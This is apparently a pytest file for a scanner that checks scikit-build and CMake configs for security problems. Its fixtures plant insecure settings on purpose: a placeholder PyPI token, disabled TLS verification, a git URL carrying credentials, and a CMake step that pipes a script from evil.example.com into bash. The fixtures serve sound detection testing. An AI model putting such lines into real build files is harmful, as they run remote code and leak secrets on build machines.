"""Tests for ScikitBuildAnalyzer."""

from pathlib import Path

from devai.scikit_build_analyzer import ScikitBuildAnalyzer


INSECURE_PYPROJECT = """\
[build-system]
requires = ["scikit-build-core"]
build-backend = "scikit_build_core.build"

[tool.scikit-build]
cmake.version = ">=3.15"
cmake.args = ["-DCMAKE_TLS_VERIFY:BOOL=OFF"]
token = "pypi-AgEIcHlwaS5vcmcvY2k-EXAMPLETOKENEXAMPLETOKENEX"

[project]
name = "insecure-cpp"
version = "*"
"""

INSECURE_CMAKE = """\
cmake_minimum_required(VERSION 3.15)
project(insecure)

FetchContent_Declare(
    dep
    GIT_REPOSITORY http://user:secret@github.com/example/lib.git
    GIT_BRANCH main
)

execute_process(COMMAND bash -c "curl http://evil.example.com/setup.sh | bash")
"""

HARDENED_PYPROJECT = """\
[build-system]
requires = ["scikit-build-core>=0.5"]
build-backend = "scikit_build_core.build"

[tool.scikit-build]
cmake.version = ">=3.15"

[project]
name = "secure-cpp"
version = "1.0.0"
"""


class TestScikitBuildAnalyzer:
    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = ScikitBuildAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0

    def test_detects_insecure_pyproject(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = ScikitBuildAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "pypi_token" in kinds
        assert "insecure_cmake_flag" in kinds
        assert "dynamic_version" in kinds

    def test_detects_insecure_cmake(self, tmp_path: Path):
        (tmp_path / "CMakeLists.txt").write_text(INSECURE_CMAKE, encoding="utf-8")
        analyzer = ScikitBuildAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "insecure_http" in kinds
        assert "scm_credentials" in kinds
        assert "unpinned_git_dep" in kinds
        assert "dangerous_cmake_command" in kinds

    def test_hardened_config_has_no_high_findings(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(HARDENED_PYPROJECT, encoding="utf-8")
        analyzer = ScikitBuildAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(HARDENED_PYPROJECT, encoding="utf-8")
        analyzer = ScikitBuildAnalyzer(str(tmp_path))
        assert "Scikit-build" in analyzer.summary()
        assert "health score" in analyzer.to_context()

    def test_generate_hardened_config(self):
        snippet = ScikitBuildAnalyzer(".").generate_hardened_config()
        assert "scikit-build" in snippet
        assert "scikit_build_core" in snippet
